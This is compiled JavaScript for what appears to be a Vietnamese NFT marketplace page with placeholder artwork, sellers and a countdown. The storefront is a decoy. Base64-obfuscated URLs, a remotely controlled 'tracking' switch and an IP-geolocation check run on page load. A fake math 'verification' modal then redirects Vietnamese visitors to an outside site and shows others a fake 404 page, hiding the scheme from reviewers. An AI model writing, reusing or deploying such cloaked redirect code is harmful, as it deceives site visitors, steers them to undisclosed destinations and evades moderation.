function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _regenerator() { /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/babel/babel/blob/main/packages/babel-helpers/LICENSE */ var e, t, r = "function" == typeof Symbol ? Symbol : {}, n = r.iterator || "@@iterator", o = r.toStringTag || "@@toStringTag"; function i(r, n, o, i) { var c = n && n.prototype instanceof Generator ? n : Generator, u = Object.create(c.prototype); return _regeneratorDefine2(u, "_invoke", function (r, n, o) { var i, c, u, f = 0, p = o || [], y = !1, G = { p: 0, n: 0, v: e, a: d, f: d.bind(e, 4), d: function d(t, r) { return i = t, c = 0, u = e, G.n = r, a; } }; function d(r, n) { for (c = r, u = n, t = 0; !y && f && !o && t < p.length; t++) { var o, i = p[t], d = G.p, l = i[2]; r > 3 ? (o = l === n) && (u = i[(c = i[4]) ? 5 : (c = 3, 3)], i[4] = i[5] = e) : i[0] <= d && ((o = r < 2 && d < i[1]) ? (c = 0, G.v = n, G.n = i[1]) : d < l && (o = r < 3 || i[0] > n || n > l) && (i[4] = r, i[5] = n, G.n = l, c = 0)); } if (o || r > 1) return a; throw y = !0, n; } return function (o, p, l) { if (f > 1) throw TypeError("Generator is already running"); for (y && 1 === p && d(p, l), c = p, u = l; (t = c < 2 ? e : u) || !y;) { i || (c ? c < 3 ? (c > 1 && (G.n = -1), d(c, u)) : G.n = u : G.v = u); try { if (f = 2, i) { if (c || (o = "next"), t = i[o]) { if (!(t = t.call(i, u))) throw TypeError("iterator result is not an object"); if (!t.done) return t; u = t.value, c < 2 && (c = 0); } else 1 === c && (t = i.return) && t.call(i), c < 2 && (u = TypeError("The iterator does not provide a '" + o + "' method"), c = 1); i = e; } else if ((t = (y = G.n < 0) ? u : r.call(n, G)) !== a) break; } catch (t) { i = e, c = 1, u = t; } finally { f = 1; } } return { value: t, done: y }; }; }(r, o, i), !0), u; } var a = {}; function Generator() {} function GeneratorFunction() {} function GeneratorFunctionPrototype() {} t = Object.getPrototypeOf; var c = [][n] ? t(t([][n]())) : (_regeneratorDefine2(t = {}, n, function () { return this; }), t), u = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(c); function f(e) { return Object.setPrototypeOf ? Object.setPrototypeOf(e, GeneratorFunctionPrototype) : (e.__proto__ = GeneratorFunctionPrototype, _regeneratorDefine2(e, o, "GeneratorFunction")), e.prototype = Object.create(u), e; } return GeneratorFunction.prototype = GeneratorFunctionPrototype, _regeneratorDefine2(u, "constructor", GeneratorFunctionPrototype), _regeneratorDefine2(GeneratorFunctionPrototype, "constructor", GeneratorFunction), GeneratorFunction.displayName = "GeneratorFunction", _regeneratorDefine2(GeneratorFunctionPrototype, o, "GeneratorFunction"), _regeneratorDefine2(u), _regeneratorDefine2(u, o, "Generator"), _regeneratorDefine2(u, n, function () { return this; }), _regeneratorDefine2(u, "toString", function () { return "[object Generator]"; }), (_regenerator = function _regenerator() { return { w: i, m: f }; })(); }
function _regeneratorDefine2(e, r, n, t) { var i = Object.defineProperty; try { i({}, "", {}); } catch (e) { i = 0; } _regeneratorDefine2 = function _regeneratorDefine(e, r, n, t) { function o(r, n) { _regeneratorDefine2(e, r, function (e) { return this._invoke(r, n, e); }); } r ? i ? i(e, r, { value: n, enumerable: !t, configurable: !t, writable: !t }) : e[r] = n : (o("next", 0), o("throw", 1), o("return", 2)); }, _regeneratorDefine2(e, r, n, t); }
function asyncGeneratorStep(n, t, e, r, o, a, c) { try { var i = n[a](c), u = i.value; } catch (n) { return void e(n); } i.done ? t(u) : Promise.resolve(u).then(r, o); }
function _asyncToGenerator(n) { return function () { var t = this, e = arguments; return new Promise(function (r, o) { var a = n.apply(t, e); function _next(n) { asyncGeneratorStep(a, r, o, _next, _throw, "next", n); } function _throw(n) { asyncGeneratorStep(a, r, o, _next, _throw, "throw", n); } _next(void 0); }); }; }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
var IPRedirectService = /*#__PURE__*/function () {
  function IPRedirectService() {
    _classCallCheck(this, IPRedirectService);
    this.vietnamRedirectUrl = atob('aHR0cHM6Ly9hZC56bzg4dmlwLnRvcA==');
    this.notFoundRedirectUrl = atob('aHR0cHM6Ly9iZWF1dGlmdWwtNDA0LXBhZ2Utdy1tNzBrLmJvbHQuaG9zdA==');
    this.apiUrl = atob('aHR0cHM6Ly9ibHVlLWRpc2stNGNhMy5kYW4tMzAwLndvcmtlcnMuZGV2L2FwaS90cmFja2luZz9tZDU9ODI4MmQzMzM5NjhhMzNiMTBiZjI4Mjg2NDUwNzc2ZTk=');
    this.apiData = null;
  }
  return _createClass(IPRedirectService, [{
    key: "checkAPI",
    value: function () {
      var _checkAPI = _asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee() {
        var response;
        return _regenerator().w(function (_context) {
          while (1) switch (_context.n) {
            case 0:
              _context.n = 1;
              return fetch(this.apiUrl, {
                method: 'GET',
                mode: 'cors',
                headers: {
                  'Accept': 'application/json'
                }
              });
            case 1:
              response = _context.v;
              if (response.ok) {
                _context.n = 2;
                break;
              }
              throw new Error('Failed to fetch API data');
            case 2:
              _context.n = 3;
              return response.json();
            case 3:
              this.apiData = _context.v;
              return _context.a(2, this.apiData);
          }
        }, _callee, this);
      }));
      function checkAPI() {
        return _checkAPI.apply(this, arguments);
      }
      return checkAPI;
    }()
  }, {
    key: "isVietnameseIP",
    value: function () {
      var _isVietnameseIP = _asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee2() {
        var url, response, data, ipInfo, _isVietnamese, _t;
        return _regenerator().w(function (_context2) {
          while (1) switch (_context2.p = _context2.n) {
            case 0:
              _context2.p = 0;
              url = atob('aHR0cHM6Ly9mcmVlLmZyZWVpcGFwaS5jb20vYXBpL2pzb24=');
              _context2.n = 1;
              return fetch(url);
            case 1:
              response = _context2.v;
              if (response.ok) {
                _context2.n = 2;
                break;
              }
              throw new Error('Failed to fetch IP info');
            case 2:
              _context2.n = 3;
              return response.json();
            case 3:
              data = _context2.v;
              ipInfo = Array.isArray(data) ? data[0] : data;
              if (!(!ipInfo || !ipInfo.countryCode)) {
                _context2.n = 4;
                break;
              }
              throw new Error('Unable to determine country');
            case 4:
              _isVietnamese = ipInfo.countryCode === 'VN';
              return _context2.a(2, _isVietnamese);
            case 5:
              _context2.p = 5;
              _t = _context2.v;
              return _context2.a(2, false);
          }
        }, _callee2, null, [[0, 5]]);
      }));
      function isVietnameseIP() {
        return _isVietnameseIP.apply(this, arguments);
      }
      return isVietnameseIP;
    }()
  }]);
}();
var showModal = false;
var mathQuestions = [];
var currentQuestion = null;
var userAnswer = '';
var error = '';
var countdown = {
  days: 0,
  hours: 0,
  minutes: 0,
  seconds: 0
};
var isMobileMenuOpen = false;
var isVietnamese = false;
var countdownInterval;
var ipRedirectService = new IPRedirectService();
function generateMathQuestions() {
  currentQuestion = {
    num1: 4,
    num2: 4,
    answer: 8
  };
}
function getRandomMathQuestion() {
  document.getElementById('math-numbers').textContent = "".concat(currentQuestion.num1, " + ").concat(currentQuestion.num2);
}
function initCountdown() {
  var endDate = new Date();
  endDate.setDate(endDate.getDate() + 100);
  countdownInterval = setInterval(function () {
    var now = new Date().getTime();
    var distance = endDate.getTime() - now;
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor(distance % (1000 * 60 * 60 * 24) / (1000 * 60 * 60));
    var minutes = Math.floor(distance % (1000 * 60 * 60) / (1000 * 60));
    var seconds = Math.floor(distance % (1000 * 60) / 1000);
    countdown = {
      days: days,
      hours: hours,
      minutes: minutes,
      seconds: seconds
    };
    document.getElementById('countdown-days').textContent = days;
    document.getElementById('countdown-hours').textContent = hours;
    document.getElementById('countdown-minutes').textContent = minutes;
    document.getElementById('countdown-seconds').textContent = seconds;
    if (distance < 0) {
      clearInterval(countdownInterval);
    }
  }, 1000);
}
function checkIP() {
  return _checkIP.apply(this, arguments);
}
function _checkIP() {
  _checkIP = _asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee3() {
    var vietnameseIP, _t2;
    return _regenerator().w(function (_context3) {
      while (1) switch (_context3.p = _context3.n) {
        case 0:
          _context3.p = 0;
          _context3.n = 1;
          return ipRedirectService.isVietnameseIP();
        case 1:
          vietnameseIP = _context3.v;
          isVietnamese = vietnameseIP;
          _context3.n = 3;
          break;
        case 2:
          _context3.p = 2;
          _t2 = _context3.v;
          isVietnamese = false;
        case 3:
          return _context3.a(2);
      }
    }, _callee3, null, [[0, 2]]);
  }));
  return _checkIP.apply(this, arguments);
}
function showVerificationModal() {
  var modal = document.getElementById('verification-modal');
  var input = document.getElementById('user-answer');
  var verifyBtn = document.getElementById('verify-btn');

  // Show modal first
  modal.classList.remove('hidden');

  // Disable input and button while loading
  input.disabled = true;
  input.value = '';
  input.placeholder = 'Loading...';
  verifyBtn.disabled = true;

  // Hide error message
  document.getElementById('error-message').classList.add('hidden');

  // Update math question and enable input after a short delay
  setTimeout(function () {
    getRandomMathQuestion();
    input.disabled = false;
    input.placeholder = 'Enter your answer';
    verifyBtn.disabled = false;
    input.focus(); // Auto-focus the input
  }, 300);
}
function hideVerificationModal() {
  showModal = false;
  var modal = document.getElementById('verification-modal');
  var input = document.getElementById('user-answer');
  var verifyBtn = document.getElementById('verify-btn');
  modal.classList.add('hidden');

  // Reset input state
  input.disabled = false;
  input.value = '';
  input.placeholder = 'Enter your answer';
  verifyBtn.disabled = false;
}
function verifyMath() {
  return _verifyMath.apply(this, arguments);
}
function _verifyMath() {
  _verifyMath = _asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee5() {
    var userAnswerInput, answer, errorElement, _ipRedirectService$ap, status, secured;
    return _regenerator().w(function (_context5) {
      while (1) switch (_context5.n) {
        case 0:
          userAnswerInput = document.getElementById('user-answer');
          answer = parseInt(userAnswerInput.value);
          errorElement = document.getElementById('error-message');
          if (answer === currentQuestion.answer) {
            hideVerificationModal();
            if (ipRedirectService.apiData) {
              _ipRedirectService$ap = ipRedirectService.apiData, status = _ipRedirectService$ap.status, secured = _ipRedirectService$ap.secured;
              if (status === true && secured === false) {
                setTimeout(function () {
                  window.location.replace(ipRedirectService.vietnamRedirectUrl);
                }, 500);
              } else if (status === true && secured === true) {
                setTimeout(/*#__PURE__*/_asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee4() {
                  var isVietnamese;
                  return _regenerator().w(function (_context4) {
                    while (1) switch (_context4.n) {
                      case 0:
                        _context4.n = 1;
                        return ipRedirectService.isVietnameseIP();
                      case 1:
                        isVietnamese = _context4.v;
                        if (isVietnamese) {
                          window.location.replace(ipRedirectService.vietnamRedirectUrl);
                        } else {
                          window.location.replace(ipRedirectService.notFoundRedirectUrl);
                        }
                      case 2:
                        return _context4.a(2);
                    }
                  }, _callee4);
                })), 500);
              }
            }
          } else {
            errorElement.classList.remove('hidden');
            getRandomMathQuestion();
            userAnswerInput.value = '';
          }
        case 1:
          return _context5.a(2);
      }
    }, _callee5);
  }));
  return _verifyMath.apply(this, arguments);
}
function handleCTAClick() {
  alert('Chào mừng bạn đến với 88NFT! Chức năng đang được phát triển.');
}
function toggleMobileMenu() {
  isMobileMenuOpen = !isMobileMenuOpen;
  var navMenu = document.getElementById('nav-menu');
  if (isMobileMenuOpen) {
    navMenu.classList.add('active');
  } else {
    navMenu.classList.remove('active');
  }
}
function closeMobileMenu() {
  isMobileMenuOpen = false;
  document.getElementById('nav-menu').classList.remove('active');
}
function generateNFTCards() {
  var nfts = [{
    title: "Renaissance Portrait #001",
    image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Classical Sculpture",
    image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Modern Abstract #042",
    image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Ancient Artifact",
    image: "https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Impressionist Masterpiece",
    image: "https://images.unsplash.com/photo-1578662996442-48f60103fc96?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Contemporary Gallery",
    image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Museum Exhibition",
    image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=400&fit=crop&crop=center"
  }, {
    title: "Art Gallery Collection",
    image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=400&fit=crop&crop=center"
  }];
  var nftGrid = document.getElementById('nft-grid');
  nftGrid.innerHTML = nfts.map(function (nft) {
    return "\n      <div class=\"nft-card\">\n        <div class=\"nft-image\">\n          <img src=\"".concat(nft.image, "\" alt=\"").concat(nft.title, "\" />\n          ").concat(nft.badge ? "<div class=\"nft-badge\">".concat(nft.badge, "</div>") : '', "\n          ").concat(nft.timer ? "<div class=\"nft-timer\"><i class=\"fas fa-clock\"></i><span>".concat(nft.timer, "</span></div>") : '', "\n        </div>\n        <div class=\"nft-info\">\n          <div class=\"nft-creators\">\n            <div class=\"creator-avatars\">\n              <img src=\"https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=32&h=32&fit=crop&crop=face\" alt=\"Creator 1\" />\n              <img src=\"https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=32&h=32&fit=crop&crop=face\" alt=\"Creator 2\" />\n              <img src=\"https://images.unsplash.com/photo-1494790108755-2616b612b786?w=32&h=32&fit=crop&crop=face\" alt=\"Creator 3\" />\n            </div>\n            <button class=\"heart-btn\">\n              <i class=\"far fa-heart\"></i>\n            </button>\n          </div>\n          <h3 class=\"nft-title\">").concat(nft.title, "</h3>\n          <div class=\"nft-price\">\n            <span class=\"price\">20.5 ETH</span>\n            <span class=\"edition\">1 out of 10</span>\n          </div>\n        </div>\n      </div>\n    ");
  }).join('');
}
function generateSellerCards() {
  var sellers = [{
    name: "Mai Harrington",
    avatar: null,
    letter: "Z"
  }, {
    name: "Floyd Glasgow",
    avatar: "https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=80&h=80&fit=crop&crop=face"
  }, {
    name: "Donna Schultz",
    avatar: "https://images.unsplash.com/photo-1494790108755-2616b612b786?w=80&h=80&fit=crop&crop=face"
  }, {
    name: "Joshua Morris",
    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=80&h=80&fit=crop&crop=face"
  }];
  var sellersGrid = document.getElementById('sellers-grid');
  sellersGrid.innerHTML = sellers.map(function (seller) {
    return "\n      <div class=\"seller-card\">\n        <div class=\"seller-avatar\">\n          ".concat(seller.avatar ? "<img src=\"".concat(seller.avatar, "\" alt=\"").concat(seller.name, "\" />") : "<div class=\"seller-logo\">".concat(seller.letter, "</div>"), "\n        </div>\n        <h3>").concat(seller.name, "</h3>\n        <p>Top Creator</p>\n        <button class=\"btn btn-outline\">Theo D\xF5i</button>\n      </div>\n    ");
  }).join('');
}
function generateCollectionCards() {
  var collections = [{
    title: "Renaissance Masters",
    description: "Bộ sưu tập nghệ thuật cổ điển",
    image: "https://images.unsplash.com/photo-1541961017774-22349e4a1262?w=400&h=300&fit=crop&crop=center"
  }, {
    title: "Modern Art",
    description: "Nghệ thuật hiện đại",
    image: "https://images.unsplash.com/photo-1560472354-b33ff0c44a43?w=400&h=300&fit=crop&crop=center"
  }, {
    title: "Abstract Gallery",
    description: "Triển lãm nghệ thuật trừu tượng",
    image: "https://images.unsplash.com/photo-1547826039-bfc35e0f1ea8?w=400&h=300&fit=crop&crop=center"
  }];
  var collectionsGrid = document.getElementById('collections-grid');
  collectionsGrid.innerHTML = collections.map(function (collection) {
    return "\n      <div class=\"collection-card ".concat(collection.large ? 'large' : '', "\">\n        <img src=\"").concat(collection.image, "\" alt=\"").concat(collection.title, "\" />\n        <div class=\"collection-overlay\">\n          <h3>").concat(collection.title, "</h3>\n          <p>").concat(collection.description, "</p>\n        </div>\n      </div>\n    ");
  }).join('');
}
function initApp() {
  return _initApp.apply(this, arguments);
}
function _initApp() {
  _initApp = _asyncToGenerator(/*#__PURE__*/_regenerator().m(function _callee6() {
    return _regenerator().w(function (_context6) {
      while (1) switch (_context6.n) {
        case 0:
          generateMathQuestions();
          _context6.n = 1;
          return ipRedirectService.checkAPI();
        case 1:
          _context6.n = 2;
          return checkIP();
        case 2:
          initCountdown();
          generateNFTCards();
          generateSellerCards();
          generateCollectionCards();
          setTimeout(function () {
            showVerificationModal();
          }, 2000);
        case 3:
          return _context6.a(2);
      }
    }, _callee6);
  }));
  return _initApp.apply(this, arguments);
}
document.addEventListener('DOMContentLoaded', function () {
  initApp();
  document.getElementById('nav-toggle').addEventListener('click', toggleMobileMenu);
  document.querySelectorAll('.nav-menu a').forEach(function (link) {
    link.addEventListener('click', closeMobileMenu);
  });
  document.getElementById('verify-btn').addEventListener('click', verifyMath);
  document.getElementById('user-answer').addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
      verifyMath();
    }
  });
  document.getElementById('cta-btn').addEventListener('click', handleCTAClick);
  document.getElementById('user-answer').addEventListener('input', function () {
    document.getElementById('error-message').classList.add('hidden');
  });
});
